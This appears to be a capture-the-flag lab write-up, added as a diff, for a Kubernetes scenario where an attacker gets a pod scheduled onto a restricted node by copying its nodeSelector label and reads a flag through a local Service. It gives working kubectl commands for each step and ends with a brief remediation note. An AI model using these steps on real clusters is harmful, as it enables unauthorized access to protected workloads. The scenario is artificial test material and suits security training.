@@ -1,0 +1,86 @@
+# K8S-28: Node Selector Evasion
+
+## 场景信息
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-28 |
+| 名称 | Node Selector Evasion |
+| 技术/CVE | N/A (scheduling bypass) |
+| 难度 | L2 |
+| 交付方式 | KIND / Kubernetes |
+| 入口 | KIND 集群内入口（无固定宿主端口） |
+
+## 场景概述
+- 技术：N/A (scheduling bypass)
+- 难度：L2
+- 交付方式：k8s
+## 攻击路径与利用步骤
+
+## Overview
+| Property | Value |
+|----------|-------|
+| CVE/Technique | N/A (nodeSelector scheduling bypass) |
+| Difficulty | L2 |
+| Type | k8s (KIND cluster, multi-node) |
+| Cluster Name | cve-k8s-28-node-evasion |
+| Flag Location | `/flag.txt` in flag-holder pod on restricted node |
+
+## Attack Path Summary
+```
+Attacker pod (no nodeSelector) → Discover restricted node with security=restricted label → Create new pod with nodeSelector: security=restricted → Pod schedules on restricted node → Access flag via local Service
+```
+
+## Prerequisites
+
+### Knowledge
+- Kubernetes scheduling: Understanding nodeSelector and how it constrains pod placement
+- Node labels: Knowing that kubectl describe node shows labels, and kubectl get nodes --show-labels displays them
+- Pod-to-Service communication: Using wget/curl from inside a pod to access a Service by ClusterIP
+
+### Tools
+- kubectl: K8s API interaction (get nodes, run pods, exec, describe)
+
+## Step-by-Step Exploitation
+
+### Step 1: Discover Node Labels
+```bash
+kubectl get nodes --show-labels
+# Note: worker node has label security=restricted
+```
+
+### Step 2: Create Pod with Matching nodeSelector
+```bash
+kubectl run evader --image=alpine:latest -n secure-ns \
+  --overrides='{"spec":{"nodeSelector":{"security":"restricted"}}}' \
+  -- sleep 3600
+```
+
+### Step 3: Wait for Pod and Access Flag
+```bash
+kubectl wait --for=condition=Ready pod/evader -n secure-ns --timeout=30s
+FLAG_IP=$(kubectl get svc flag-svc -n secure-ns -o jsonpath='{.spec.clusterIP}')
+kubectl exec -n secure-ns evader -- wget -qO- http://${FLAG_IP}:8080
+```
+
+## Flag Location
+- `/flag.txt` in the `flag-holder` pod running on the restricted node
+
+## Verification Commands
+```bash
+kubectl cluster-info --context kind-cve-k8s-28-node-evasion
+kubectl get nodes --show-labels
+```
+
+## 此场景利用了哪些知识
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Kubernetes scheduler, node selectors, and labels |
+| 侦察与前置条件 | Scheduling constraints and mutable node/pod selector fields |
+| 核心漏洞与利用 | Evade a restrictive node selector |
+| 权限、横向或影响 | Workload placement on a protected node |
+| 验证 | Verify access to the target node's flag |
+
+## 修复建议
+升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
